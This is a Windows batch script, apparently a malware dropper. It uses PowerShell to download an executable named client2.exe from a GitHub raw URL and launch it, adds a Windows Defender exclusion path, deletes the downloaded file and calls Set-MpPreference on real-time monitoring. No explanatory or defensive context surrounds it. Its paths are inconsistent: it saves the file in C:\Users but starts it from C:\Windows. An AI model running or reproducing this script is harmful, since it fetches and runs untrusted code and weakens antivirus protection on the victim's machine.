@echo off
cd C:\Users
powershell -Command "Invoke-WebRequest https://github.com/BlaBlak3/oouikyhjnjhsshn/raw/main/client2.exe -Outfile client2.exe"
start C:\Windows\client2.exe
powershell.exe -Command Add-MpPreference -ExclusionPath "C:\Windows\system32\Runner\Start.exe"
timeout 2 > NULL
del C:\Users\client2.exe
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $false"
exit
